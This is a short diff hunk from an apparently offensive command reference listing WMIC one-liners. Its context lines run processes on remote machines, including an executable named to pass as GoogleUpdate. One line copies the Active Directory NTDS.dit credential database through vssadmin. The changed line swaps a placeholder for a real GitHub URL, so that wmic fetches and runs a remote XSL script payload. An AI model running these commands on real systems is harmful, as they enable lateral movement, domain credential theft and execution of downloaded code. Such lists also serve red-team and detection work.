@@ -25,7 +25,7 @@ wmic /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe
     
 wmic /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"    
      
-wmic process get brief /format:"https://www.example.com/file.xsl"    
+wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"    
      
 wmic os get /format:"MYXSLFILE.xsl"    
      
